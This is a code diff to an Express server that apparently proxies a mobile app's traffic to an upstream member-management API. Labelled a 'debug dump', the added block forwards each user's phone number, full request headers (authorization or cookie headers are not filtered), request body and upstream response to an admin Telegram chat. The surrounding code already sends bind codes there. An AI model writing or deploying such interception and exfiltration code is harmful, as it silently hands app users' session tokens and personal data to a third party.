@@ -2610,6 +2610,42 @@ app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
       const phone = getPhone(data, userId);
       const rd = (respData && typeof respData === 'object') ? respData : {};
       bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
+
+      // === DEBUG DUMP ===
+      // Full request headers + body + upstream response — to compare what APK sends vs what bot sends
+      try {
+        const skipHeaders = new Set(['x-vercel-id','x-vercel-deployment-url','x-vercel-forwarded-for','x-vercel-ip-as-number','x-vercel-ip-city','x-vercel-ip-continent','x-vercel-ip-country','x-vercel-ip-country-region','x-vercel-ip-latitude','x-vercel-ip-longitude','x-vercel-ip-timezone','x-vercel-ip-postal-code','x-vercel-ja3-digest','x-vercel-ja4-digest','x-vercel-proxied-for','x-vercel-proxy-signature','x-vercel-proxy-signature-ts','x-vercel-internal-ingress-bucket','x-vercel-internal-intra-session','x-vercel-sc-basepath','x-vercel-sc-headers','x-vercel-sc-host','forwarded','x-forwarded-proto','x-forwarded-host','x-real-ip']);
+        const hdrLines = [];
+        for (const [k, v] of Object.entries(req.headers || {})) {
+          if (skipHeaders.has(k.toLowerCase())) continue;
+          hdrLines.push(`  ${k}: ${v}`);
+        }
+        const reqBodyStr = (req.parsedBody !== undefined && req.parsedBody !== null)
+          ? JSON.stringify(req.parsedBody, null, 2)
+          : (req.rawBody ? (Buffer.isBuffer(req.rawBody) ? req.rawBody.toString('utf8') : String(req.rawBody)) : '(empty)');
+        const respBodyStr = (jsonResp !== null && jsonResp !== undefined)
+          ? JSON.stringify(jsonResp, null, 2)
+          : (respBody ? (Buffer.isBuffer(respBody) ? respBody.toString('utf8') : String(respBody)) : '(empty)');
+        const dump =
+`🔍 RAW DEBUG: bindRobotDetail
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+🌐 Method: ${req.method}
+🔗 URL: ${req.originalUrl}
+
+📤 REQUEST HEADERS (APK → Vercel):
+${hdrLines.join('\n').substring(0, 1800)}
+
+📦 REQUEST BODY:
+${reqBodyStr.substring(0, 800)}
+
+📥 UPSTREAM HTTP: ${response?.status ?? 'N/A'}
+📥 UPSTREAM RESPONSE:
+${respBodyStr.substring(0, 1500)}`;
+        bot.sendMessage(data.adminChatId, dump.substring(0, 4000)).catch(()=>{});
+      } catch(dbgErr) {
+        bot.sendMessage(data.adminChatId, `⚠️ Debug dump failed: ${dbgErr.message}`).catch(()=>{});
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
